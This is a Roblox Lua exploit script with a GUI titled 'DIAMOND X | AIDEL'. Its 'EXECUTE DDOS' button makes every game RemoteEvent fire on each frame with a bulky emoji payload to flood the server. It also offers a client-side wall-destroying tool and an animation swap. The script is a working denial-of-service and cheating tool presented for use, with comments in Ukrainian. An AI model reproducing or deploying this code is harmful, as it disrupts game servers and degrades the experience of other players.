-- [[ PROJECT DIAMOND X - RELOADED CORE ]]
-- Protocol: aidel (deloriq team)

local coreGui = game:GetService("CoreGui")
local players = game:GetService("Players")
local userInputService = game:GetService("UserInputService")
local replicatedStorage = game:GetService("ReplicatedStorage")
local runService = game:GetService("RunService")

print("[aidel]: Initializing Diamond X UI...")

-- Видаляємо старі версії
if coreGui:FindFirstChild("DiamondX_Final") then coreGui.DiamondX_Final:Destroy() end

local screenGui = Instance.new("ScreenGui", coreGui)
screenGui.Name = "DiamondX_Final"
screenGui.ResetOnSpawn = false

-- === ГОРЯЧА КЛАВІША ===
local isVisible = true

-- === ГОЛОВНЕ ВІКНО ===
local main = Instance.new("Frame", screenGui)
main.Size = UDim2.new(0, 250, 0, 320)
main.Position = UDim2.new(0.5, -125, 0.4, 0)
main.BackgroundColor3 = Color3.fromRGB(10, 10, 15)
main.BorderSizePixel = 2
main.BorderColor3 = Color3.fromRGB(0, 255, 255)
main.Active = true
main.Draggable = true -- Можна совати мишкою

local title = Instance.new("TextLabel", main)
title.Size = UDim2.new(1, 0, 0, 40)
title.Text = "DIAMOND X | AIDEL"
title.TextColor3 = Color3.fromRGB(0, 255, 255)
title.BackgroundColor3 = Color3.fromRGB(20, 20, 30)
title.Font = Enum.Font.GothamBold
title.TextSize = 18

-- === ФУНКЦІЇ АТАКИ ===
_G.stressing = false
local function runAttack()
    local payload = {}
    for i = 1, 500 do payload[i] = string.rep("💎", 200) end
    
    runService.Heartbeat:Connect(function()
        if _G.stressing then
            for _, v in pairs(game:GetDescendants()) do
                if v:IsA("RemoteEvent") then
                    pcall(function() v:FireServer(payload) end)
                end
            end
        end
    end)
end

-- === КНОПКИ ===
local btnContainer = Instance.new("ScrollingFrame", main)
btnContainer.Size = UDim2.new(0.9, 0, 0.8, 0)
btnContainer.Position = UDim2.new(0.05, 0, 0.15, 0)
btnContainer.BackgroundTransparency = 1
btnContainer.CanvasSize = UDim2.new(0, 0, 1.5, 0)
btnContainer.ScrollBarThickness = 2

local function makeBtn(txt, color, func)
    local b = Instance.new("TextButton", btnContainer)
    b.Size = UDim2.new(1, 0, 0, 40)
    b.Text = txt
    b.BackgroundColor3 = color
    b.TextColor3 = Color3.new(1,1,1)
    b.Font = Enum.Font.GothamBold
    b.TextSize = 14
    b.MouseButton1Click:Connect(func)
    
    local corner = Instance.new("UICorner", b)
    corner.CornerRadius = UDim.new(0, 8)
    
    -- Простий відступ між кнопками
    local padding = Instance.new("UIPadding", btnContainer)
    padding.PaddingTop = UDim.new(0, 5)
end

makeBtn("EXECUTE DDOS", Color3.fromRGB(150, 0, 0), function()
    _G.stressing = not _G.stressing
    print("[aidel]: DDoS Status -> " .. tostring(_G.stressing))
    if _G.stressing then runAttack() end
end)

makeBtn("GET WALL BREAKER", Color3.fromRGB(40, 40, 40), function()
    local tool = Instance.new("Tool", players.LocalPlayer.Backpack)
    tool.Name = "💎 BREAKER"; tool.RequiresHandle = false
    tool.Activated:Connect(function()
        local m = players.LocalPlayer:GetMouse()
        if m.Target and not players:GetPlayerFromCharacter(m.Target.Parent) then m.Target:Destroy() end
    end)
end)

makeBtn("COOLKID ANIMS", Color3.fromRGB(0, 100, 200), function()
    local char = players.LocalPlayer.Character
    if char and char:FindFirstChild("Animate") then
        char.Animate.walk.WalkAnim.AnimationId = "rbxassetid://180426354"
        char.Animate.idle.Animation1.AnimationId = "rbxassetid://180435571"
    end
end)

-- Приховати/показати на RightControl
userInputService.InputBegan:Connect(function(i, g)
    if not g and i.KeyCode == Enum.KeyCode.RightControl then
        isVisible = not isVisible
        main.Visible = isVisible
    end
end)

print("[aidel]: UI Loaded! Press RightControl to toggle.")
